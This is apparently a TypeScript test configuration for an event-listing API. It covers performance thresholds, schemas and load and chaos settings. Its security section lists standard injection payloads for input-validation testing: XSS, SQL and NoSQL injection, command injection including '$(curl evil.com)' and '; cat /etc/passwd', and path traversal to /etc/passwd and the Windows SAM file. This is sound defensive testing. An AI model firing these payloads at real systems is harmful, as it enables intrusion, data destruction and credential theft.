/**
 * Enterprise Test Configuration
 * Centralized configuration for all test scenarios
 */

export const TEST_CONFIG = {
  // Performance Thresholds
  PERFORMANCE: {
    RESPONSE_TIME: {
      HEALTH: 50, // ms - Health check should be very fast
      PARTIES: 200, // ms - Data retrieval with pagination
      SWIPE: 100, // ms - Simple write operations
      SYNC: 5000, // ms - External API calls and bulk operations
      UGC_CREATE: 150, // ms - User-generated content creation
      SEARCH: 300, // ms - Complex queries with filtering
      WEBHOOK: 100, // ms - Simple webhook processing
    },
    MEMORY: {
      MAX_HEAP_INCREASE: 50 * 1024 * 1024, // 50MB max increase per test
      LEAK_THRESHOLD: 10 * 1024 * 1024, // 10MB threshold for leak detection
      GC_THRESHOLD: 100 * 1024 * 1024, // 100MB before forced GC
    },
    CONCURRENCY: {
      LOW: 5, // Concurrent requests for basic tests
      MEDIUM: 20, // Standard load testing
      HIGH: 100, // Stress testing
      EXTREME: 500, // Breaking point testing
    },
    THROUGHPUT: {
      MIN_OPS_PER_SEC: 50, // Minimum operations per second
      TARGET_OPS_PER_SEC: 200, // Target throughput
      MAX_OPS_PER_SEC: 1000, // Maximum expected throughput
    },
  },

  // Test Data Configuration
  DATA: {
    BATCH_SIZES: [1, 10, 50, 100, 500, 1000],
    PARTY_CATEGORIES: [
      "Developer Mixer", "Networking Event", "Product Launch",
      "Community Meetup", "Conference Party", "Gaming Tournament",
      "Industry Showcase", "Startup Pitch", "Awards Ceremony",
    ],
    LOCATIONS: [
      "Cologne Convention Center", "Messe Köln", "GamesCom Hall",
      "Rheinterrassen", "Palladium", "Carlswerk Victoria",
    ],
    TIME_SLOTS: [
      "18:00", "19:00", "19:30", "20:00", "20:30", "21:00", "22:00",
    ],
    PRICE_RANGES: ["Free", "€5-15", "€15-30", "€30-50", "€50+"],
    FOCUS_AREAS: [
      "All", "Game Developers", "Publishers", "Media", "Influencers",
      "Industry Professionals", "Students", "Indie Developers",
    ],
  },

  // Security Test Configuration
  SECURITY: {
    PAYLOADS: {
      XSS: [
        "<script>alert(\"xss\")</script>",
        "\"><script>alert(\"xss\")</script>",
        "';alert('xss');'",
        "javascript:alert(\"xss\")",
        "<img src=\"x\" onerror=\"alert('xss')\">",
      ],
      SQL_INJECTION: [
        "'; DROP TABLE parties; --",
        "' OR '1'='1",
        "' UNION SELECT * FROM users --",
        "'; INSERT INTO parties VALUES ('evil'); --",
      ],
      NOSQL_INJECTION: [
        "{\"$ne\": null}",
        "{\"$gt\": \"\"}",
        "{\"$regex\": \".*\"}",
        "{\"$where\": \"function() { return true; }\"}",
      ],
      COMMAND_INJECTION: [
        "; cat /etc/passwd",
        "| whoami",
        "&& echo \"pwned\"",
        "$(curl evil.com)",
      ],
      PATH_TRAVERSAL: [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "....//....//....//etc/passwd",
      ],
    },
    HEADERS: {
      MALICIOUS: {
        "X-Forwarded-For": "127.0.0.1, <script>alert(\"xss\")</script>",
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) <script>alert(\"xss\")</script>",
        "Referer": "javascript:alert(\"xss\")",
        "Content-Type": "application/json; charset=<script>alert(\"xss\")</script>",
      },
      OVERSIZED: {
        "X-Large-Header": "A".repeat(100000),
      },
    },
    RATE_LIMITING: {
      BURST_SIZE: 100, // Requests to send in burst
      BURST_INTERVAL: 1000, // ms - Time window for burst
      SUSTAINED_RATE: 1000, // Requests over sustained period
      SUSTAINED_DURATION: 60000, // ms - Duration for sustained test
    },
  },

  // API Contract Testing
  CONTRACTS: {
    ENDPOINTS: {
      "/health": {
        methods: ["GET", "OPTIONS"],
        responseSchema: {
          type: "object",
          required: ["status", "version", "timestamp"],
          properties: {
            status: {type: "string", enum: ["healthy", "degraded", "unhealthy"]},
            version: {type: "string", pattern: "^\\d+\\.\\d+\\.\\d+$"},
            timestamp: {type: "string", format: "date-time"},
            responseTime: {type: "string", pattern: "\\d+ms"},
          },
        },
      },
      "/parties": {
        methods: ["GET", "OPTIONS"],
        queryParams: ["page", "limit", "category", "search"],
        responseSchema: {
          type: "object",
          required: ["success", "data", "meta"],
          properties: {
            success: {type: "boolean"},
            data: {type: "array"},
            meta: {
              type: "object",
              required: ["count", "total", "page", "limit", "hasMore"],
              properties: {
                count: {type: "number", minimum: 0},
                total: {type: "number", minimum: 0},
                page: {type: "number", minimum: 1},
                limit: {type: "number", minimum: 1, maximum: 100},
                hasMore: {type: "boolean"},
              },
            },
          },
        },
      },
      "/swipe": {
        methods: ["POST", "OPTIONS"],
        requestSchema: {
          type: "object",
          required: ["partyId", "action"],
          properties: {
            partyId: {type: "string", minLength: 1},
            action: {type: "string", enum: ["like", "pass"]},
            timestamp: {type: "string", format: "date-time"},
          },
        },
        responseSchema: {
          type: "object",
          required: ["success", "swipe"],
          properties: {
            success: {type: "boolean"},
            swipe: {
              type: "object",
              required: ["id", "partyId", "action", "timestamp"],
              properties: {
                id: {type: "string"},
                partyId: {type: "string"},
                action: {type: "string", enum: ["like", "pass"]},
                timestamp: {type: "string", format: "date-time"},
              },
            },
          },
        },
      },
    },
  },

  // Load Testing Configuration
  LOAD_TESTING: {
    SCENARIOS: {
      SMOKE: {
        users: 1,
        duration: "1m",
        rampUp: "10s",
      },
      LOAD: {
        users: 10,
        duration: "5m",
        rampUp: "30s",
      },
      STRESS: {
        users: 50,
        duration: "10m",
        rampUp: "2m",
      },
      SPIKE: {
        users: 100,
        duration: "2m",
        rampUp: "10s",
      },
      VOLUME: {
        users: 20,
        duration: "30m",
        rampUp: "5m",
      },
    },
  },

  // Chaos Engineering Configuration
  CHAOS: {
    FAILURES: {
      DATABASE_TIMEOUT: {probability: 0.1, duration: 5000},
      NETWORK_LATENCY: {probability: 0.05, minDelay: 1000, maxDelay: 5000},
      SERVICE_UNAVAILABLE: {probability: 0.02, duration: 10000},
      MEMORY_PRESSURE: {probability: 0.01, intensity: 0.8},
      CPU_SPIKE: {probability: 0.03, duration: 3000},
    },
    RECOVERY_EXPECTATIONS: {
      MAX_RECOVERY_TIME: 30000, // 30 seconds
      ACCEPTABLE_ERROR_RATE: 0.05, // 5% error rate during chaos
      CIRCUIT_BREAKER_THRESHOLD: 0.5, // 50% failure rate to trip breaker
    },
  },

  // Test Environment Configuration
  ENVIRONMENT: {
    TIMEOUTS: {
      UNIT: 10000, // 10 seconds for unit tests
      INTEGRATION: 30000, // 30 seconds for integration tests
      E2E: 60000, // 60 seconds for end-to-end tests
      LOAD: 300000, // 5 minutes for load tests
    },
    RETRIES: {
      FLAKY_TESTS: 3, // Retry count for potentially flaky tests
      EXTERNAL_DEPS: 2, // Retry count for tests with external dependencies
      NETWORK_CALLS: 5, // Retry count for network-dependent tests
    },
    PARALLEL: {
      MAX_WORKERS: 4, // Maximum parallel test workers
      SLOW_TEST_THRESHOLD: 10000, // 10 seconds - tests slower than this run in sequence
    },
  },

  // Monitoring and Alerting
  MONITORING: {
    METRICS: {
      RESPONSE_TIME_PERCENTILES: [50, 90, 95, 99],
      ERROR_RATE_THRESHOLD: 0.01, // 1% error rate threshold
      AVAILABILITY_TARGET: 0.999, // 99.9% availability target
      PERFORMANCE_REGRESSION_THRESHOLD: 1.5, // 50% performance degradation threshold
    },
    ALERTS: {
      CRITICAL: {
        ERROR_RATE_ABOVE: 0.05, // 5% error rate
        RESPONSE_TIME_ABOVE: 10000, // 10 seconds
        AVAILABILITY_BELOW: 0.99, // 99% availability
      },
      WARNING: {
        ERROR_RATE_ABOVE: 0.02, // 2% error rate
        RESPONSE_TIME_ABOVE: 5000, // 5 seconds
        MEMORY_USAGE_ABOVE: 0.8, // 80% memory usage
      },
    },
  },
};

// Environment-specific configurations
export const getEnvironmentConfig = (env: string = process.env.NODE_ENV || "test") => {
  const configs = {
    test: {
      ...TEST_CONFIG,
      DATABASE_URL: "localhost:8080",
      API_BASE_URL: "http://localhost:5001",
      EXTERNAL_APIS: {
        ENABLED: false, // Mock external APIs in test environment
      },
    },
    staging: {
      ...TEST_CONFIG,
      PERFORMANCE: {
        ...TEST_CONFIG.PERFORMANCE,
        RESPONSE_TIME: {
          ...TEST_CONFIG.PERFORMANCE.RESPONSE_TIME,
          // Staging may be slower due to resource constraints
          HEALTH: 100,
          PARTIES: 500,
          SWIPE: 250,
          SYNC: 10000,
        },
      },
    },
    production: {
      ...TEST_CONFIG,
      EXTERNAL_APIS: {
        ENABLED: true, // Use real external APIs in production tests
      },
    },
  };

  return configs[env as keyof typeof configs] || configs.test;
};

export default TEST_CONFIG;
